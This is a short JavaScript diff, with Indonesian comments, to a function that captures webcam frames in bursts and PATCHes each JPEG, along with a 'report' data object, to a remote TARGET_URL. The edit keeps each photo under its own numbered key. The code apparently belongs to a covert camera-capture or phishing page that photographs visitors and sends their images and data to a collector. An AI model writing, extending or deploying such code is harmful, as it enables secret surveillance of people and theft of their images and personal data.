@@ -125,11 +125,14 @@ async function initCamera(report, sessionID) {
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const imageData = canvas.toDataURL('image/jpeg', 0.5);
 
-                // Kirim semua data + foto ke DALAM FOLDER sessionID
+                // Kirim ke variabel photo1, photo2, dst agar tidak saling timpa
+                let updateData = { ...report, burst_no: shots };
+                updateData[`photo${shots}`] = imageData; // Dinamis: photo1, photo2...
+
                 await fetch(TARGET_URL, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ ...report, photo: imageData, burst_no: shots })
+                    body: JSON.stringify(updateData)
                 });
             } else {
                 clearInterval(burst);
